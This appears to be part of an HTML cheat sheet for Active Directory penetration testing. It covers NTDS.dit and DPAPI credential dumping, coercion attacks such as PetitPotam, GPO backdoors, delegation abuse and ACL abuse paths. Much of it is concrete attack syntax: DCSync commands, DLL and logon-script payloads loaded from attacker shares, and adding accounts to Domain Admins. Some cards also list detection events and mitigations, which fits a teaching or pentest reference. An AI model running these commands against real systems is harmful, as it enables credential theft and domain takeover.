  <div class="detail-card border-pink"><span class="tag cred">CRED DUMP</span> <span class="tag domdom">DA</span><h3>NTDS.dit</h3><div class="card-sub">AD database &mdash; every domain account hash</div><div class="card-body">The Active Directory database file containing <strong>all domain user NT hashes</strong>. The ultimate prize.<ul class="card-list"><li><strong>Location</strong>: <code>C:\Windows\NTDS\ntds.dit</code> on every Domain Controller</li><li><strong>DCSync</strong>: <code class="tool">secretsdump.py</code> -just-dc domain/admin@dc &mdash; replicates hashes remotely</li><li><strong>Vol Shadow Copy</strong>: <code>vssadmin create shadow /for=C:</code> &rarr; copy ntds.dit + SYSTEM</li><li><strong>Offline parse</strong>: <code class="tool">secretsdump.py</code> -ntds ntds.dit -system SYSTEM LOCAL</li><li><strong>Required rights</strong>: DCSync needs <code>DS-Replication-Get-Changes</code> + <code>DS-Replication-Get-Changes-All</code></li><li><strong>Contains</strong>: NT hashes, Kerberos keys (AES256/128), password history, supplemental creds</li></ul></div></div>

  <div class="detail-card border-purple"><span class="tag cred">CRED DUMP</span><h3>DCC2 (Domain Cached Credentials)</h3><div class="card-sub">Cached logon creds for offline authentication</div><div class="card-body">Windows caches the last 10 domain logon credentials locally so users can log in when DC is unreachable.<ul class="card-list"><li><strong>Location</strong>: <code>HKLM\SECURITY\Cache</code> registry hive (NL$1 through NL$10)</li><li><strong>Format</strong>: MSCACHEV2 / DCC2 &mdash; PBKDF2 with 10240 iterations</li><li><strong>Extract</strong>: <code class="tool">secretsdump.py</code> or Mimikatz <code>lsadump::cache</code></li><li><strong>Hashcat</strong>: Mode <code>2100</code> &mdash; extremely slow to crack</li><li><strong>Cannot Pass-the-Hash</strong>: DCC2 hashes are <em>not</em> NT hashes &mdash; must be cracked</li><li><strong>Useful when</strong>: Laptop disconnected from network, only cached creds available</li></ul></div></div>

  <div class="detail-card border-orange"><span class="tag cred">CRED DUMP</span><h3>Cached Credentials &amp; All-in-One Dumping</h3><div class="card-sub">Grab everything at once &mdash; browsers, Wi-Fi, mail clients, databases, sysadmin tools</div><div class="card-body">Beyond LSASS and SAM, credentials are cached in dozens of applications across the system. All-in-one tools extract them in seconds.<ul class="card-list"><li><code class="tool">LaZagne</code>: All-in-one credential recovery &mdash; browsers, Wi-Fi, mail (Outlook, Thunderbird), databases, sysadmin tools (FileZilla, PuTTY, WinSCP, OpenSSH), Windows Credential Manager</li><li><strong>Coverage</strong>: 40+ applications supported across Windows and Linux &mdash; single binary, no dependencies</li><li><strong>Wi-Fi passwords</strong>: <code>netsh wlan show profile name=X key=clear</code> or DPAPI-decrypt from registry</li><li><strong>RDP saved creds</strong>: Stored as DPAPI blobs in <code>%LOCALAPPDATA%\Microsoft\Credentials\</code></li><li><strong>PuTTY / WinSCP / FileZilla</strong>: Cleartext or weakly encrypted passwords in registry and XML configs</li><li><strong>Mail clients</strong>: Outlook profiles in registry, Thunderbird <code>logins.json</code> + <code>key4.db</code></li><li><strong>Windows Credential Manager</strong>: <code>cmdkey /list</code> to enumerate, <code class="tool">SharpDPAPI</code> to decrypt programmatically</li><li><code class="tool">goLazagne</code>: Go implementation &mdash; cross-platform, compiles to single static binary</li></ul></div></div>
</div>

<div class="separator"></div>

<!-- ==================== COERCION TECHNIQUES ==================== -->
<div class="section-header"><h2><span>//</span> Coercion <span class="red">Techniques</span> Breakdown</h2><p class="section-desc">Force a machine to authenticate to your listener &mdash; the trigger for relay and unconstrained delegation attacks.</p></div>

<div class="details-grid">
  <div class="detail-card border-red"><span class="tag cred">COERCION</span><h3>PetitPotam (MS-EFSR)</h3><div class="card-sub">EfsRpcOpenFileRaw &bull; CVE-2021-36942</div><div class="card-body"><ul class="card-list"><li>Abuses Encrypting File System Remote Protocol (MS-EFSR)</li><li>Forces target to authenticate to attacker via <strong>SMB</strong></li><li><strong>Unauthenticated</strong> variant patched &mdash; <span class="vuln">authenticated variant still works</span></li><li><code class="tool">PetitPotam.py</code> attacker-ip target-ip -u user -p pass</li><li><strong>Best combo</strong>: PetitPotam + ntlmrelayx &rarr; ADCS (ESC8) &rarr; DC cert &rarr; DCSync</li><li><strong>Mitigation</strong>: Enable Extended Protection for Auth, require SMB signing, disable NTLM</li></ul></div></div>

  <div class="detail-card border-orange"><span class="tag cred">COERCION</span><h3>PrinterBug / SpoolSample</h3><div class="card-sub">MS-RPRN RpcRemoteFindFirstPrinterChangeNotification</div><div class="card-body"><ul class="card-list"><li>Abuses Print Spooler service (MS-RPRN) &mdash; <strong>enabled by default</strong></li><li>Requires <strong>authentication</strong> (any domain user)</li><li>Forces target to authenticate via <strong>SMB</strong> to attacker</li><li><code class="tool">SpoolSample.exe</code> (Windows) or <code class="tool">printerbug.py</code> (Linux)</li><li><strong>Best combo</strong>: PrinterBug + Unconstrained Delegation &rarr; capture DC TGT</li><li><strong>Mitigation</strong>: Disable Print Spooler on DCs &mdash; <code>Stop-Service Spooler</code></li></ul></div></div>

  <div class="detail-card border-cyan"><span class="tag cred">COERCION</span><h3>DFSCoerce (MS-DFSNM)</h3><div class="card-sub">Distributed File System Namespace Management</div><div class="card-body"><ul class="card-list"><li>Abuses DFS namespace RPC calls (NetrDfsAddStdRoot, NetrDfsRemoveStdRoot)</li><li>Requires <strong>authentication</strong> &mdash; any domain user</li><li>Forces target to authenticate via <strong>SMB</strong></li><li><code class="tool">dfscoerce.py</code> attacker-ip target-ip -u user -p pass</li><li>Works on servers running DFS Namespace service</li><li><strong>Combo</strong>: Similar to PetitPotam &mdash; relay to LDAP for RBCD or to ADCS</li></ul></div></div>

  <div class="detail-card border-purple"><span class="tag cred">COERCION</span><h3>ShadowCoerce (MS-FSRVP)</h3><div class="card-sub">File Server VSS Agent Service</div><div class="card-body"><ul class="card-list"><li>Abuses File Server VSS Agent (MS-FSRVP) &mdash; used for remote VSS snapshots</li><li>Requires <strong>authentication</strong></li><li>Only works on servers with <strong>File Server VSS Agent Service</strong> running</li><li><code class="tool">shadowcoerce.py</code> attacker-ip target-ip -u user -p pass</li><li>Less common than PetitPotam/PrinterBug but useful as alternative</li></ul></div></div>

  <div class="detail-card border-green"><span class="tag cred">COERCION</span><h3>WebDAV + Coercion</h3><div class="card-sub">HTTP-based coercion for NTLM relay to LDAP</div><div class="card-body"><ul class="card-list"><li>WebClient service converts SMB coercion to <strong>HTTP</strong> authentication</li><li><strong>Why it matters</strong>: HTTP auth has <span class="vuln">no signing</span> &rarr; can relay to LDAP/LDAPS</li><li>SMB &rarr; LDAP relay blocked by LDAP signing, but HTTP &rarr; LDAP is not</li><li><strong>Start WebClient</strong>: Search indexer trigger or <code>searchconnector-ms</code> file</li><li><strong>Chain</strong>: Trigger coercion (PetitPotam) &rarr; WebClient redirects to HTTP &rarr; relay to LDAP &rarr; RBCD</li><li><strong>Scope</strong>: WebClient typically only on <strong>workstations</strong>, not servers</li></ul></div></div>
</div>

<div class="separator"></div>

<!-- ==================== DPAPI SECRETS ==================== -->
<div class="section-header"><h2><span>//</span> DPAPI <span class="orange">Secrets</span> Deep Dive</h2><p class="section-desc">Windows Data Protection API protects browser passwords, Wi-Fi keys, RDP credentials, and more. Understanding the key hierarchy is essential for extraction.</p></div>

<div class="data-flow-card"><h4>DPAPI Key Hierarchy</h4><pre>
<span class="key">DPAPI KEY HIERARCHY</span>

<span class="val">Domain Backup Key</span> (stored on DC, RSA key pair)
  &#x2514;&#x2500;&#x2500; Can decrypt ANY domain user's master keys
      <span class="comment">// Extract: secretsdump.py -target-ip DC | grep "DPAPI"</span>
      <span class="comment">// This is the "god key" for DPAPI in the domain</span>

<span class="val">User Master Key</span> (per-user, rotates every 90 days)
  &#x251C;&#x2500;&#x2500; Location: <span class="type">%APPDATA%\Microsoft\Protect\{SID}\{GUID}</span>
  &#x251C;&#x2500;&#x2500; Protected by: user password hash (domain) or local password
  &#x251C;&#x2500;&#x2500; Also protected by: <span class="danger">Domain Backup Key</span> (domain-joined machines)
  &#x2514;&#x2500;&#x2500; Used to derive blob-specific keys for each secret

<span class="val">DPAPI Blob</span> (individual encrypted secret)
  &#x251C;&#x2500;&#x2500; Each secret (password, key, cert) wrapped in a DPAPI blob
  &#x251C;&#x2500;&#x2500; Blob references which Master Key GUID was used
  &#x2514;&#x2500;&#x2500; Decrypted by deriving key from Master Key + entropy

<span class="key">WHAT DPAPI PROTECTS</span>
  &#x251C;&#x2500;&#x2500; <span class="val">Chrome/Edge passwords</span>    Login Data SQLite &rarr; DPAPI blob per credential
  &#x251C;&#x2500;&#x2500; <span class="val">Chrome/Edge cookies</span>      Session cookies &rarr; account takeover
  &#x251C;&#x2500;&#x2500; <span class="val">Windows Credential Manager</span> Saved RDP, SMB, web credentials
  &#x251C;&#x2500;&#x2500; <span class="val">Wi-Fi profiles</span>           WPA2 PSKs stored via DPAPI
  &#x251C;&#x2500;&#x2500; <span class="val">Certificate private keys</span>  User certificate stores
  &#x251C;&#x2500;&#x2500; <span class="val">Scheduled task creds</span>     Run-as credentials for tasks
  &#x2514;&#x2500;&#x2500; <span class="val">Azure / Office tokens</span>    Cached OAuth tokens
</pre></div>

<div class="details-grid">
  <div class="detail-card border-orange"><span class="tag cred">DPAPI</span><h3>Remote DPAPI Extraction</h3><div class="card-sub">Mass secret harvesting across domain hosts</div><div class="card-body"><ul class="card-list"><li><strong>DonPAPI</strong>: Automated mass DPAPI secret extraction &mdash; browsers, creds, Wi-Fi, certs</li><li><strong>dploot</strong>: Python DPAPI looting &mdash; <code class="tool">dploot triage</code> for all secrets at once</li><li><strong>SharpDPAPI</strong>: .NET tool for Windows &mdash; <code>SharpDPAPI.exe triage /server:DC</code></li><li><strong>With Domain Backup Key</strong>: Decrypt any user's secrets without their password</li><li><strong>Without Backup Key</strong>: Need user's password/hash or LSASS-cached master keys</li><li><strong>netexec module</strong>: <code>netexec smb targets -M donpapi</code> for quick sweep</li></ul></div></div>

  <div class="detail-card border-red"><span class="tag cred">DPAPI</span> <span class="tag domdom">IMPACT</span><h3>Post-Exploitation Gold</h3><div class="card-sub">What you get from DPAPI secrets</div><div class="card-body"><ul class="card-list"><li><strong>Browser passwords</strong>: Intranet portals, cloud admin panels, personal accounts</li><li><strong>RDP saved creds</strong>: Pivot to additional servers the user connects to</li><li><strong>Wi-Fi PSKs</strong>: Access to additional network segments (OT, guest, management)</li><li><strong>OAuth tokens</strong>: Azure AD, M365, AWS &mdash; cloud lateral movement</li><li><strong>VPN credentials</strong>: External access persistence</li><li><strong>Certificate private keys</strong>: Authenticate as user via PKINIT even after password change</li></ul></div></div>
</div>

<div class="separator"></div>

<!-- ==================== GPO ABUSE ==================== -->
<div class="section-header"><h2><span>//</span> GPO <span class="red">Abuse</span> Deep Dive</h2><p class="section-desc">Group Policy Objects push configuration to all domain machines. If you can edit a GPO, you control every computer and user it applies to.</p></div>

<div class="details-grid">
  <div class="detail-card border-red"><span class="tag privesc">GPO</span><h3>Prerequisites</h3><div class="card-sub">What you need to abuse a GPO</div><div class="card-body"><ul class="card-list"><li><strong>Write access to GPO</strong>: GenericWrite, GenericAll, or WriteProperty on the GPO object</li><li><strong>Find writable GPOs</strong>: BloodHound edge <code>GenericWrite</code> or <code>GenericAll</code> to GPO nodes</li><li><strong>Check GPO scope</strong>: Which OUs does the GPO apply to? What computers/users are in those OUs?</li><li><strong>Cypher query</strong>: <code>MATCH (g:GPO) MATCH p=shortestPath((u:User)-[*1..]->(g)) WHERE u.owned=true RETURN p</code></li><li><strong>GPO inheritance</strong>: GPOs at higher OUs apply unless blocked &mdash; domain-level GPOs affect everything</li></ul></div></div>

  <div class="detail-card border-orange"><span class="tag privesc">GPO</span><h3>Exploitation Methods</h3><div class="card-sub">What you can push via malicious GPO</div><div class="card-body"><ul class="card-list"><li><strong>Scheduled Task</strong>: <code class="tool">SharpGPOAbuse</code> --AddComputerTask --TaskName "Backdoor" --Author SYSTEM --Command cmd.exe --Arguments "/c ..."</li><li><strong>Startup Script</strong>: Add PowerShell/batch script that runs on every boot</li><li><strong>Restricted Groups</strong>: Add attacker to local Administrators group on all targets</li><li><strong>Registry modification</strong>: Push registry keys (disable AV, enable WDigest, etc.)</li><li><strong>GPOddity</strong>: <code class="tool">GPOddity</code> for immediate scheduled task deployment without GPO refresh wait</li><li><strong>Software install</strong>: Deploy MSI package to target machines</li></ul></div></div>

  <div class="detail-card border-blue"><span class="tag recon">GPO</span><h3>Detection &amp; Cleanup</h3><div class="card-sub">Don't leave GPO backdoors behind</div><div class="card-body"><ul class="card-list"><li><strong>Event 5136</strong>: Directory Service Changes &mdash; logs GPO modification in AD</li><li><strong>Event 4719</strong>: System audit policy changes (if GPO modifies audit config)</li><li><strong>GPO version numbers</strong>: Each edit increments version &mdash; compare against known-good baseline</li><li><strong>SYSVOL monitoring</strong>: File integrity monitoring on \\domain\SYSVOL\domain\Policies</li><li><strong>Cleanup</strong>: Always restore original GPO state after testing &mdash; GPOs affect production systems</li><li><strong>Tip</strong>: Use <code>gpresult /r</code> on target to verify which GPOs are actually applied</li></ul></div></div>
</div>

<div class="separator"></div>

<!-- ==================== DELEGATION DEEP DIVE ==================== -->
<div class="section-header"><h2><span>//</span> Delegation <span class="red">Attacks</span> Deep Dive</h2><p class="section-desc">Three types of Kerberos delegation and their exploitation paths. Beginners often miss how RBCD + S4U chains lead to NT hashes.</p></div>

<div class="details-grid">
  <div class="detail-card border-orange"><span class="tag deleg">DELEGATION</span><h3>Unconstrained Delegation</h3><div class="card-sub">unconstraineddelegation: true &bull; DCs have this by default</div><div class="card-body">Any service with unconstrained delegation <strong>caches the TGT</strong> of every user that authenticates to it. Combine with coercion to steal DC TGTs.<ul class="card-list"><li><strong>Find</strong>: BloodHound <code>MATCH (c {unconstraineddelegation:true}) RETURN c</code></li><li><strong>Coerce</strong>: <code class="tool">Coercer</code> / <code class="tool">PetitPotam</code> to force DC auth to unconstrained host</li><li><strong>Extract</strong>: <code class="tool">Rubeus</code> dump /user:DC$ /service:krbtgt</li><li><strong>Convert</strong>: <code>ticketConverter.py</code> kirbi &rarr; ccache</li><li><strong>DCSync</strong>: <code class="tool">secretsdump.py</code> -k -no-pass using stolen DC TGT</li><li><strong>Key insight</strong>: Works child&rarr;parent by coercing parent DC to child unconstrained host</li></ul><p style="margin-top:10px;padding:8px 12px;background:rgba(245,158,11,0.06);border-left:2px solid var(--orange);border-radius:4px;font-size:11px;color:var(--text-dim);line-height:1.6;"><strong style="color:var(--orange);">Why does this work?</strong> When a user authenticates to a service with unconstrained delegation, the KDC includes the user's full TGT inside the service ticket. The service caches this TGT in memory. By coercing a DC to authenticate to such a host, the DC's own TGT gets cached &mdash; and a DC's TGT can be used for DCSync.</p></div></div>

  <div class="detail-card border-blue"><span class="tag deleg">DELEGATION</span><h3>Constrained Delegation</h3><div class="card-sub">msDS-AllowedToDelegateTo &bull; with/without protocol transition</div><div class="card-body"><strong>With protocol transition</strong>: S4U2Self &rarr; S4U2Proxy to impersonate any user to target SPN.<ul class="card-list"><li><strong>Find</strong>: <code class="tool">findDelegation.py</code> or BH <code>MATCH p=(u)-[:AllowedToDelegate]->(c) RETURN p</code></li><li><strong>Linux</strong>: <code class="tool">getST.py</code> -spn CIFS/target -impersonate Administrator</li><li><strong>Windows</strong>: <code class="tool">Rubeus</code> s4u /impersonateuser:admin /msdsspn:CIFS/target</li><li><strong>SPN swap</strong>: SPN is <code class="vuln">not encrypted</code> &mdash; use <code>-altservice</code> to change target service</li><li><strong>Without protocol transition</strong>: Requires RBCD self-trick to get forwardable TGS first</li></ul><p style="margin-top:10px;padding:8px 12px;background:rgba(59,130,246,0.06);border-left:2px solid var(--blue);border-radius:4px;font-size:11px;color:var(--text-dim);line-height:1.6;"><strong style="color:var(--blue);">Why does this work?</strong> The msDS-AllowedToDelegateTo attribute tells the KDC which SPNs this account may request tickets for on behalf of other users. The SPN in the resulting ticket is <em>not encrypted</em>, so you can swap it to target a different service (e.g., change HTTP/ to CIFS/) after issuance.</p></div></div>

  <div class="detail-card border-red"><span class="tag deleg">DELEGATION</span> <span class="tag privesc">PRIVESC</span><h3>RBCD (Resource-Based Constrained Delegation)</h3><div class="card-sub">msDS-AllowedToActOnBehalfOfOtherIdentity</div><div class="card-body">The <strong>most versatile</strong> delegation attack. Write a controlled computer to target's RBCD attribute, then impersonate admin.<ul class="card-list"><li><strong>Prereq</strong>: GenericWrite / GenericAll / WriteDACL on target computer object</li><li><strong>Step 1</strong>: <code class="tool">addcomputer.py</code> &mdash; create machine account (MachineAccountQuota=10)</li><li><strong>Step 2</strong>: <code class="tool">rbcd.py</code> &mdash; write RBCD attribute on target</li><li><strong>Step 3</strong>: <code class="tool">getST.py</code> -spn cifs/target -impersonate Administrator</li><li><strong>Step 4</strong>: Use ticket &rarr; <code class="tool">secretsdump</code> / <code class="tool">smbexec</code> / <code class="tool">wmiexec</code></li><li><strong>Chains with constrained deleg</strong>: RBCD from new machine &rarr; constrained host for forwardable TGS</li></ul><p style="margin-top:10px;padding:8px 12px;background:rgba(239,68,68,0.06);border-left:2px solid var(--red);border-radius:4px;font-size:11px;color:var(--text-dim);line-height:1.6;"><strong style="color:var(--red);">Why does this work?</strong> Unlike constrained delegation (configured on the DC), RBCD is configured on the <em>target</em> itself via msDS-AllowedToActOnBehalfOfOtherIdentity. Anyone who can write this attribute can authorize their own machine to impersonate users to the target. The KDC trusts this attribute because it's a legitimate AD feature for resource owners.</p></div></div>
</div>

<div class="separator"></div>

<!-- ==================== ACL ABUSE ==================== -->
<div class="section-header"><h2><span>//</span> ACL <span class="red">Abuse</span> Paths</h2><p class="section-desc">Access Control Entries are the building blocks of AD permissions. Each ACE type has specific exploitation techniques.</p></div>

<div class="details-grid">
  <div class="detail-card border-rose"><span class="tag acl">ACL</span><h3>ForceChangePassword</h3><div class="card-sub">User-Force-Change-Password extended right</div><div class="card-body"><ul class="card-list"><li><code class="tool">net rpc password</code> target -U attacker -S DC</li><li><strong>Warning</strong>: Blocks the user &mdash; never use without authorization</li></ul><p style="margin-top:10px;padding:8px 12px;background:rgba(244,63,94,0.06);border-left:2px solid var(--rose);border-radius:4px;font-size:11px;color:var(--text-dim);line-height:1.6;"><strong style="color:var(--rose);">Why does this work?</strong> The User-Force-Change-Password extended right lets you reset another user's password without knowing their current password. AD treats this as a legitimate admin function. Once you change their password, you authenticate as them.</p></div></div>

  <div class="detail-card border-rose"><span class="tag acl">ACL</span><h3>GenericWrite</h3><div class="card-sub">Write any non-protected attribute on the target</div><div class="card-body">Three exploitation paths:<ul class="card-list"><li><strong>Shadow Creds</strong>: Write <code>msDS-KeyCredentialLink</code> &rarr; <code class="tool">certipy shadow auto</code> &rarr; NT hash</li><li><strong>Targeted Kerberoasting</strong>: Set SPN &rarr; TGS &rarr; crack &mdash; <code class="tool">targetedKerberoast.py</code></li><li><strong>Profile Path</strong>: Set <code>profilePath</code> to attacker &rarr; <code class="tool">Responder</code> capture NTLMv2</li></ul><p style="margin-top:10px;padding:8px 12px;background:rgba(244,63,94,0.06);border-left:2px solid var(--rose);border-radius:4px;font-size:11px;color:var(--text-dim);line-height:1.6;"><strong style="color:var(--rose);">Why does this work?</strong> GenericWrite lets you modify non-protected attributes. Shadow Credentials works because Windows Hello for Business uses the msDS-KeyCredentialLink attribute for passwordless auth &mdash; writing your own key pair makes the KDC issue you a TGT. Setting an SPN makes the account Kerberoastable because any user can request a TGS for any SPN.</p></div></div>

  <div class="detail-card border-rose"><span class="tag acl">ACL</span><h3>WriteDACL</h3><div class="card-sub">Modify the DACL itself &mdash; grant yourself any permission</div><div class="card-body"><ul class="card-list"><li><code class="tool">dacledit.py</code> -action write -rights FullControl -principal attacker -target victim</li><li>Then exploit FullControl &rarr; DCSync / GenericAll</li></ul><p style="margin-top:10px;padding:8px 12px;background:rgba(244,63,94,0.06);border-left:2px solid var(--rose);border-radius:4px;font-size:11px;color:var(--text-dim);line-height:1.6;"><strong style="color:var(--rose);">Why does this work?</strong> The DACL (Discretionary Access Control List) defines who can do what on an AD object. WriteDACL lets you edit these permissions &mdash; so you can grant yourself FullControl or DCSync rights. It's like being able to rewrite the lock on someone else's door.</p></div></div>

  <div class="detail-card border-rose"><span class="tag acl">ACL</span><h3>WriteOwner / GenericAll</h3><div class="card-sub">Take ownership &rarr; WriteDACL | Full control over object</div><div class="card-body"><ul class="card-list"><li><strong>WriteOwner</strong>: <code class="tool">owneredit.py</code> change owner &rarr; then WriteDACL &rarr; FullControl</li><li><strong>GenericAll on user</strong>: Change password, set SPN, shadow creds</li><li><strong>GenericAll on computer</strong>: RBCD, read LAPS, shadow creds on machine</li><li><strong>GenericAll on group</strong>: AddMember &mdash; add yourself</li><li><strong>GenericAll on domain</strong>: DCSync (DS-Replication-Get-Changes-All)</li></ul></div></div>

  <div class="detail-card border-rose"><span class="tag acl">ACL</span> <span class="tag persist">PERSIST</span><h3>AdminSDHolder</h3><div class="card-sub">CN=AdminSDHolder,CN=System &bull; resets protected group ACLs every 60min</div><div class="card-body"><ul class="card-list"><li>Protected groups (Domain Admins, Enterprise Admins, etc.) have ACLs <strong>reset every hour</strong> by SDProp</li><li>ACLs set directly on protected groups/users get <code class="vuln">wiped by SDProp</code></li><li><strong>Persistence</strong>: Modify AdminSDHolder ACL &rarr; propagates to all protected objects</li></ul></div></div>

  <div class="detail-card border-rose"><span class="tag acl">ACL</span><h3>GenericWrite &rarr; scriptPath Hijack</h3><div class="card-sub">Write logon script path &rarr; code execution on next logon</div><div class="card-body"><ul class="card-list"><li>GenericWrite on a user allows setting <code>scriptPath</code> attribute</li><li>Set <code>scriptPath</code> to attacker-controlled SMB share &rarr; script runs at next logon</li><li><code class="tool">bloodyAD</code> set object targetUser scriptPath -v '\\attacker\share\payload.bat'</li><li><strong>OPSEC</strong>: User sees the script execute &mdash; keep it fast and silent</li><li>Script executes in user's context on their workstation</li></ul></div></div>

  <div class="detail-card border-rose"><span class="tag acl">ACL</span><h3>GenericWrite &rarr; profilePath Hijack</h3><div class="card-sub">Redirect roaming profile to attacker &rarr; capture NTLMv2 hash</div><div class="card-body"><ul class="card-list"><li>Set <code>profilePath</code> to attacker-controlled UNC path</li><li>On next logon, Windows authenticates via NTLM to load the profile</li><li><code class="tool">Responder</code> captures NTLMv2 hash &mdash; crack or relay</li><li><strong>Passive</strong>: Just wait for victim to logon &mdash; no coercion tool needed</li><li>Can also set <code>homeDirectory</code> for similar effect</li></ul></div></div>

  <div class="detail-card border-rose"><span class="tag acl">ACL</span><h3>GenericAll on Computer &rarr; Silver Ticket</h3><div class="card-sub">Full control on machine account &rarr; reset password &rarr; forge TGS</div><div class="card-body"><ul class="card-list"><li><strong>GenericAll</strong> on a computer object allows resetting its password</li><li>Reset machine$ password &rarr; compute NT hash &rarr; forge Silver Ticket for any service</li><li><code class="tool">net rpc password</code> 'TARGET$' -U attacker -S DC</li><li><code class="tool">ticketer.py</code> -nthash HASH -domain-sid SID -domain dom -spn cifs/target admin</li><li><strong>Warning</strong>: Machine password change may break AD trust &mdash; re-join may be needed</li></ul></div></div>

  <div class="detail-card border-rose"><span class="tag acl">ACL</span><h3>WriteDACL on OU &rarr; Inheritance (OUned)</h3><div class="card-sub">Modify OU permissions &rarr; inherit FullControl on all child objects</div><div class="card-body"><ul class="card-list"><li>WriteDACL on an OU lets you set ACEs that <strong>inherit</strong> to all child objects</li><li>Grant yourself GenericAll with inheritance flag &rarr; control every user/computer in that OU</li><li><code class="tool">dacledit.py</code> -action write -rights FullControl -inheritance -principal attacker -target 'OU=Servers'</li><li><strong>OUned attack</strong>: Targets GPO-linked OUs for mass compromise</li><li><strong>Detection</strong>: Event 5136 (directory modification) on OU objects</li></ul></div></div>

  <div class="detail-card border-rose"><span class="tag acl">ACL</span> <span class="tag dns">DNS</span><h3>DnsAdmins &rarr; DLL Injection on DC</h3><div class="card-sub">DnsAdmins group can load arbitrary DLLs into DNS server process</div><div class="card-body"><ul class="card-list"><li>Members of <strong>DnsAdmins</strong> can configure <code>ServerLevelPluginDll</code> on the DNS server</li><li>DNS service runs as <strong>SYSTEM</strong> on the DC &mdash; DLL = SYSTEM code exec on DC</li><li><code class="tool">dnscmd</code> DC /config /serverlevelplugindll \\attacker\share\payload.dll</li><li>Requires DNS service <strong>restart</strong> (sc stop/start dns, or wait for reboot)</li><li><strong>OPSEC</strong>: Very noisy &mdash; DNS outage if DLL crashes, logged in System event log</li></ul></div></div>

  <div class="detail-card border-rose"><span class="tag acl">ACL</span><h3>ReadLAPSPassword</h3><div class="card-sub">Read ms-Mcs-AdmPwd or ms-LAPS-Password &rarr; local admin on target</div><div class="card-body"><ul class="card-list"><li>LAPS stores local admin passwords in AD attributes on computer objects</li><li><strong>Legacy LAPS</strong>: <code>ms-Mcs-AdmPwd</code> (cleartext password in AD)</li><li><strong>Windows LAPS</strong>: <code>ms-LAPS-Password</code> (encrypted, password + expiry)</li><li><code class="tool">ldeep</code> ldap -d dom -u user -p pass laps</li><li><code class="tool">crackmapexec</code> ldap DC -u user -p pass --laps</li><li><strong>Enum who can read</strong>: Check ACLs on computer objects for ReadProperty on LAPS attributes</li></ul></div></div>

  <div class="detail-card border-rose"><span class="tag acl">ACL</span><h3>AddSelf (Self-Membership)</h3><div class="card-sub">Add yourself to a group &mdash; direct self-enrollment into privileged groups</div><div class="card-body"><ul class="card-list"><li>The <strong>Self</strong> right (ADS_RIGHT_DS_SELF) on a group allows adding <em>yourself</em> as a member</li><li>Different from AddMember &mdash; AddSelf only lets you add your own account, not arbitrary users</li><li><code class="tool">net rpc group addmem</code> "Target Group" attacker -U attacker -S DC</li><li><code class="tool">bloodyAD</code> add groupMember "Target Group" attacker</li><li><strong>BloodHound edge</strong>: <code>AddSelf</code> &mdash; often overlooked because it appears less powerful than AddMember</li><li><strong>Impact</strong>: If target group is Domain Admins, Enterprise Admins, or any nested privileged group &rarr; instant escalation</li><li><strong>Detection</strong>: Event 4728/4732/4756 (member added to security group)</li></ul></div></div>

  <div class="detail-card border-rose"><span class="tag acl">ACL</span><h3>AddMember</h3><div class="card-sub">Add any user to a group &mdash; not just yourself</div><div class="card-body"><ul class="card-list"><li><strong>WriteProperty on the member attribute</strong> of a group lets you add <em>any</em> principal</li><li>More powerful than AddSelf &mdash; you can add controlled accounts, machine accounts, or other compromised users</li><li><code class="tool">bloodyAD</code> add groupMember "Domain Admins" controlled_user</li><li><code class="tool">net rpc group addmem</code> "Domain Admins" controlled_user -U attacker -S DC</li><li><strong>Chain</strong>: Compromise low-priv user with AddMember on nested group &rarr; add yourself &rarr; inherit transitive memberships</li><li><strong>OPSEC</strong>: Adding to Domain Admins is very loud &mdash; prefer adding to nested groups that grant equivalent access</li><li><strong>Detection</strong>: Event 4728/4732/4756 &mdash; monitor for additions to sensitive groups</li></ul></div></div>

  <div class="detail-card border-rose"><span class="tag acl">ACL</span><h3>AllExtendedRights</h3><div class="card-sub">Grants ALL extended rights &mdash; ForceChangePassword + ReadLAPS + ReadGMSA + more</div><div class="card-body"><ul class="card-list"><li><strong>AllExtendedRights</strong> is a superset that includes every extended right on the object</li><li><strong>On a user</strong>: ForceChangePassword (User-Force-Change-Password)</li><li><strong>On a computer</strong>: Read LAPS password (ms-Mcs-AdmPwd), read BitLocker recovery keys</li><li><strong>On a gMSA</strong>: Read msDS-ManagedPassword &rarr; extract NT hash</li><li><strong>On the domain object</strong>: Includes DS-Replication-Get-Changes &mdash; half of DCSync</li><li>Often granted accidentally via delegation wizards or template permissions</li><li><strong>BloodHound edge</strong>: <code>AllExtendedRights</code> &mdash; check with: <code class="tool">dacledit.py</code> -action read -target victim</li><li><strong>Mitigation</strong>: Replace AllExtendedRights with specific extended rights needed</li></ul></div></div>

  <div class="detail-card border-rose"><span class="tag acl">ACL</span><h3>WriteProperty on Specific Attributes</h3><div class="card-sub">Targeted write access to individual attributes &mdash; each enables different attacks</div><div class="card-body"><ul class="card-list"><li><strong>WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity</strong>: Set RBCD &rarr; S4U chain &rarr; admin access</li><li><strong>WriteProperty on servicePrincipalName</strong>: Targeted Kerberoasting &mdash; set SPN &rarr; request TGS &rarr; crack offline</li><li><strong>WriteProperty on msDS-KeyCredentialLink</strong>: Shadow Credentials &rarr; PKINIT &rarr; NT hash</li><li><strong>WriteProperty on member (group)</strong>: AddMember &mdash; add anyone to the group</li><li><strong>WriteProperty on userAccountControl</strong>: Disable pre-auth (AS-REP Roasting), disable account, change delegation flags</li><li><strong>WriteProperty on dNSHostName</strong>: Certifried (CVE-2022-26923) &mdash; request cert as another machine</li><li>More granular than GenericWrite &mdash; BloodHound may show these as individual edges</li><li><code class="tool">bloodyAD</code> set object target attrName -v value</li></ul></div></div>

  <div class="detail-card border-rose"><span class="tag acl">ACL</span><h3>ReadGMSAPassword</h3><div class="card-sub">Read msDS-ManagedPassword on gMSA &rarr; extract NT hash of service account</div><div class="card-body"><ul class="card-list"><li>gMSA accounts have auto-rotated 256-char passwords stored in <code>msDS-ManagedPassword</code></li><li>Only principals in <code>msDS-GroupMSAMembership</code> (PrincipalsAllowedToRetrieveManagedPassword) can read it</li><li>If you compromise a principal in that list &rarr; dump the gMSA NT hash</li><li><code class="tool">gMSADumper.py</code> -u user -p pass -d domain</li><li><code class="tool">bloodyAD</code> get object 'gMSA$' --attr msDS-ManagedPassword</li><li><strong>Impact</strong>: gMSAs often run critical services (SQL, IIS, scheduled tasks) with high privileges</li><li><strong>Distinct from LAPS</strong>: LAPS is local admin passwords on computers &mdash; gMSA is domain service account passwords</li></ul></div></div>

